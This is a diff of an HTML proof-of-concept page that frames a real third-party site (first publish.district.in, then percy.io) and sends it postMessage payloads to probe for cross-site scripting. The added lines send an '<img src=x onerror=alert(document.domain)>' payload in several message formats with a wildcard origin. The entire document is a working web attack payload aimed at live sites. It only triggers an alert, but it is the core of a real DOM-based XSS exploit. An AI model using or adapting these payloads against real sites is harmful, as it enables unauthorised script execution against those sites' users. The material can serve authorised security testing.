@@ -1,6 +1,10 @@
-<iframe id='t' src='https://publish.district.in/'></iframe>
+<iframe id='t' src='https://percy.io/'></iframe>
     <script>
-    document.querySelector('iframe').onload=()=>{
-      frames[0].postMessage('javascript:alert(document.domain)','*');
+    document.querySelector('#t').onload=()=>{
+      var p='<img src=x onerror=alert(document.domain)>';
+      frames[0].postMessage(p,'*');
+      frames[0].postMessage({type:'msg',data:p},'*');
+      frames[0].postMessage({action:'render',html:p},'*');
+      frames[0].postMessage(JSON.stringify({content:p}),'*');
     };
     </script>
